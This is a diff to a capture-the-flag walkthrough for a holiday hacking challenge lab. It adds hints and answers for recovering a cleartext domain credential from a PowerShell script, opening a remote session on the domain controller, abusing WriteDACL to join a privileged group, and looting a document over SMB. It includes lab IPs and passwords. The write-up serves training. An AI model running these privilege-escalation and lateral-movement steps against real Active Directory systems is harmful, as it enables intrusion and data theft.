@@ -83,6 +83,83 @@ smbclient -U elfu_svc -L \\SHARE30 -I 10.128.3.30
 ```
 </details>
 
+<details>
+  <summary>Escalation or Pivoting - Hint 4</summary>
+  What could I use in here?
+</details>
+<details>
+  <summary>Escalation or Pivoting - Answer 4</summary>
+  get GetProcessInfo.ps1
+  
+  Find creds for RCE method inside GetProcessInfo.ps1
+  
+  pwsh -File GetProcessInfo.ps1 or pwsh -Command ./GetProcessInfo.ps1
+</details>
+
+<details>
+  <summary>RCE Hint 1</summary>
+  What are the different ways I can get a shell or session on the remote host? We know it's the Domain Controller based on nmap scans.
+</details>
+<details>
+  <summary>RCE Answer 1</summary>
+  Modify the RCE command for a session instead. Powershell has a built-in session setup command - https://github.com/chrisjd20/hhc21_powershell_snippets
+</details>
+<details>
+  <summary>RCE Hint 2</summary>
+  It may work better if you can extract the cleartext password and pass that into the Enter-PSSession call.
+</details>
+<details>
+  <summary>RCE Answer 2</summary>
+  $creds = New-Object System.Management.Automation.PSCredential -ArgumentList ("elfu.local\remote_elf", "A1d655f7f5d98b10!")
+  
+  Enter-PSSession -ComputerName 10.128.1.53 -Credential $creds -Authentication Negotiate
+</details>
+
+<details>
+  <summary>Privilege Escalation - Hint 1</summary>
+  Info: https://github.com/chrisjd20/hhc21_powershell_snippets
+  
+  Tip: $ldapConnString = "LDAP://CN=WHICH_GROUP_DO_WE_PROBABLY_WANT,CN=Users,DC=elfu,DC=local"
+</details>
+<details>
+  <summary>Privilege Escalation - Hint 2</summary>
+  Our objective is to get the research doc. Where should we look for it? How can we escalate privileges to get it? https://github.com/dirkjanm/ldapdomaindump
+</details>
+<details>
+  <summary>Privilege Escalation - Answer</summary>
+  When abusing the WriteDACL permission that remote_elf has, the first large chunk hhc21_powershell_snippets script uses the remote_elf permissions. 
+  
+  Another hhc21_powershell_snippets script assigns a group to the SSH user permissions. Which group looks familiar? The Research Group!
+  
+  Verify SSH username membership in the group:
+
+```
+pwsh
+> net group "ResearchDepartment" /domain`
+```
+  
+</details>
+
+<details>
+  <summary>Loot - Hint 1</summary>
+  Remember the main objective is to get the research doc. Do you remember where you should have seen a likely place for research documents?
+</details>
+<details>
+  <summary>Loot - Answer 1</summary>
+  smbclient -U knuefahyyw \\\\SHARE30\\research_dep -I 10.128.3.30
+  
+  get SantaSecretToAWonderfulHolidaySeason.pdf
+</details>
+<details>
+  <summary>Loot - Hint 2</summary>
+  
+</details>
+<details>
+  <summary>Loot - Answer 2</summary>
+  
+</details>
+
+
 
 <br/>
 <br/>
@@ -161,12 +238,10 @@ Find creds for RCE method inside GetProcessInfo.ps1
 ### RCE on the DC
 Modify the RCE command for a session instead
 info: https://github.com/chrisjd20/hhc21_powershell_snippets
+Extract the clear-text password.
 ```
-cat GetProcessInfo.ps1
-$SecStringPassword = "76492d1116743f0423413b16050a5345MgB8AGcAcQBmAEIAMgBiAHUAMwA5AGIAbQBuAGwAdQAwAEIATgAwAEoAWQBuAGcAPQA9AHwANgA5ADgAMQA1ADIANABmAGIAMAA1AGQAOQA0AGMANQBlADYAZAA2ADEAMgA3AGIANwAxAGUAZgA2AGYAOQBiAGYAMwBjADEAYwA5AGQANABlAGMAZAA1ADUAZAAxADUANwAxADMAYwA0ADUAMwAwAGQANQA5ADEAYQBlADYAZAAzADUAMAA3AGIAYwA2AGEANQAxADAAZAA2ADcANwBlAGUAZQBlADcAMABjAGUANQAxADEANgA5ADQANwA2AGEA"
-$aPass = $SecStringPassword | ConvertTo-SecureString -Key 2,3,1,6,2,8,9,9,4,3,4,5,6,8,7,7
-$aCred = New-Object System.Management.Automation.PSCredential -ArgumentList ("elfu.local\remote_elf", $aPass)
-Invoke-Command -ComputerName 10.128.1.53 -ScriptBlock { Get-Process } -Credential $aCred -Authentication Negotiate
+$creds = New-Object System.Management.Automation.PSCredential -ArgumentList ("elfu.local\remote_elf", "A1d655f7f5d98b10!")
+Enter-PSSession -ComputerName 10.128.1.53 -Credential $creds -Authentication Negotiate
 ```
 
 ### Privilege Escalation
